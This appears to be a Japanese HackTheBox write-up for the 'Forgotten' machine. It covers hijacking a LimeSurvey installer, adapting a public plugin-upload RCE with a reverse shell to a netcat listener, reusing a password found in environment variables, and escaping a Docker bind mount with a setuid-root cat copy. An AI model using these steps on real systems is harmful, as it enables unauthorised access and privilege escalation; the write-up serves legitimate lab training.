---
title: 'Forgotten'
description: 'HackTheBox MachineのWriteup'
pubDate: 2026-02-17T19:30:00+09:00
category: 'HTB'
tags: ['HTB Machine', 'Writeup', 'Linux', 'LimeSurvey', 'Docker']
---

# Forgotten - HachTheBox

## 初期侵入
### ポート調査
```bash
nmap 10.129.234.81 -Pn
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### ディレクトリ調査
```bash
$ feroxbuster -u http://10.129.234.81
301      GET        9l       28w      315c http://10.129.234.81/survey => http://10.129.234.81/survey/
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      323c http://10.129.234.81/survey/modules => http://10.129.234.81/survey/modules/
301      GET        9l       28w      321c http://10.129.234.81/survey/admin => http://10.129.234.81/survey/admin/
301      GET        9l       28w      319c http://10.129.234.81/survey/tmp => http://10.129.234.81/survey/tmp/
301      GET        9l       28w      323c http://10.129.234.81/survey/plugins => http://10.129.234.81/survey/plugins/
301      GET        9l       28w      322c http://10.129.234.81/survey/themes => http://10.129.234.81/survey/themes/
301      GET        9l       28w      322c http://10.129.234.81/survey/assets => http://10.129.234.81/survey/assets/
301      GET        9l       28w      322c http://10.129.234.81/survey/upload => http://10.129.234.81/survey/upload/
301      GET        9l       28w      329c http://10.129.234.81/survey/assets/images => http://10.129.234.81/survey/assets/images/
```

### LimeSurvey installerの調査
`http://10.129.234.81/survey/`でアクセスすると、データベースを作成する画面に遷移する

データベースに外部からアクセスできるようにファイルを書き換える
```bash
# sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
bind-address = 0.0.0.0
```

rootユーザーだとうまくいかなかったのでローカルのデータベースにtestユーザーを作成した
```bash
sudo mysql -u root -p
CREATE USER 'test'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON test.* TO 'test'@'%';
FLUSH PRIVILEGES;
```

設定が完了したらinstall開始
```bash
YII_CSRF_TOKEN=bm1yWEI4S3lHX0NKcDAxT0VRVWVDb3pzQmhYb3lpNFGwE6dPQjwMy6ZmUrxWrfGfujWC3KrZlBbFYQt-SR6YKg%3D%3D
&InstallerConfigForm%5Bdbtype%5D=mysql
&InstallerConfigForm%5Bdbengine%5D=MYISAM
&InstallerConfigForm%5Bdblocation%5D=10.10.14.99
&InstallerConfigForm%5Bdbuser%5D=test
&InstallerConfigForm%5Bdbpwd%5D=password
&InstallerConfigForm%5Bdbname%5D=test
&InstallerConfigForm%5Bdbprefix%5D=lime_
&yt0=%E6%AC%A1%E3%81%B8
```

データベースのinsatllが完了したらアカウントを作成できるようになる  
ログインするとLimeのversionがあるので既知の脆弱性を調べる
```bash
LimeSurvey Community Edition Version 6.3.7+231127
```

### Limesurvey-RCE 環境に合わせて変更
[Limesurvey-RCE](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/tree/main)

**変更が必要なファイル**

- exploit.py
- php-rev.php
- config.xml

`exploit.py`は filehandle が/rootと作成者が使用したディレクトリになっているのでカレントディレクトリに変更
```py
filehandle = open("./Y1LD1R1M.zip",mode = "rb") # CHANGE THIS
```
`php-rev.php`は ReversShell ようの IP と PORT を変更する必要がある
```php
$ip = '10.10.14.99';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```

上記の変更だけで実行していたが、失敗したので`config.xml`を確認してみると
```xml
<compatibility>
  <version>3.0</version>
  <version>4.0</version>
  <version>5.0</version>
</compatibility>
```
plugin をアップロードできる version が 5.0 までだったので今回の version6.3.7 に対応できるように追加する必要がある
```xml
<compatibility>
  <version>3.0</version>
  <version>4.0</version>
  <version>5.0</version>
  <version>6.0</version>
</compatibility>
```

### Limesurvey-RCE 実行

```bash
# tty01
python3 exploit.py http://10.129.234.81/survey admin password 80

[+] Reverse Shell Starting, Check Your Connection :)

# tty02
nc -lnvp 4444
$ id
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)

# 有用なデータベースは見つからなかった
$ find . -name *.db
./vendor/yiisoft/yii/demos/phonebook/protected/data/phonebook.db
./vendor/yiisoft/yii/demos/blog/protected/data/blog.db
./vendor/yiisoft/yii/demos/blog/protected/data/blog-test.db
./vendor/yiisoft/yii/framework/cli/views/webapp/protected/data/testdrive.db

# LIMESURVEY_PASS=5W5HN4K4GCXf9Eを発見
$ printenv
APACHE_CONFDIR=/etc/apache2
HOSTNAME=efaa6f5097ed
PHP_INI_DIR=/usr/local/etc/php
LIMESURVEY_ADMIN=limesvc
SHLVL=0
OLDPWD=/var/www/html
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.0.30
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_GROUP=limesvc
APACHE_RUN_USER=limesvc
APACHE_LOG_DIR=/var/log/apache2
LIMESURVEY_PASS=5W5HN4K4GCXf9E
PWD=/var/www/html/survey
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++ gcc              libc-dev                make            pkg-config          re2c
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_ENVVARS=/etc/apache2/envvars

# Docker containerで動いていることがわかった
$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Dec  2  2023 /.dockerenv
```

### SSHアクセス
```bash
ssh limesvc@10.129.234.81 # 5W5HN4K4GCXf9E

limesvc@forgotten:~$ ls
user.txt
```

## 権限昇格

SSH側では簡単に突破できそうなところはなかった
```bash
# SSH
limesvc@forgotten:~$ find / -perm -4000 2>/dev/null
/usr/bin/fusermount3
/usr/bin/pkexec

limesvc@forgotten:~$ find /etc -writable 2>/dev/null
/etc/systemd/system/systemd-networkd.service
/etc/systemd/system/systemd-timesyncd.service
/etc/systemd/system/sudo.service
/etc/udev/rules.d/60-cdrom_id.rules

limesvc@forgotten:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/snap/snapd/24792/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/snap/core20/2599/usr/bin/ping cap_net_raw=ep
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
/snap/core22/2045/usr/bin/ping cap_net_raw=ep

```

Container側をよく観察してみる
```bash
# Docker container
$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required

$ echo "5W5HN4K4GCXf9E" | sudo -S -l 

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for limesvc: Matching Defaults entries for limesvc on efaa6f5097ed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL
```

共有ファイルがないか調査していると host と共有している箇所を見つけた
```bash
# Docker container
$ mount
/dev/root on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /var/www/html/survey type ext4 (rw,relatime,discard,errors=remount-ro)

$ findmnt -T /var/www/html/survey -o TARGET,SOURCE,FSTYPE,OPTIONS
TARGET               SOURCE                     FSTYPE OPTIONS
/var/www/html/survey /dev/root[/opt/limesurvey] ext4   rw,relatime,discard,errors=remount-ro
```

今回はフラグを取るだけの作業をする

> root shellをとるならCで実行ファイルを作成してもいい
```bash
# Docker container
$ which cat
/bin/cat

$ cp /bin/cat ./rootcat

$ echo "5W5HN4K4GCXf9E" | sudo -S chown root:root rootcat

$ echo "5W5HN4K4GCXf9E" | sudo -S chmod u+s rootcat
```

```bash
# SSH
limesvc@forgotten:/opt/limesurvey$ ls -la rootcat
-rwsr-xr-x 1 root root 35288 Feb 15 08:17 rootcat

limesvc@forgotten:/opt/limesurvey$ ./rootcat /root/root.txt
```
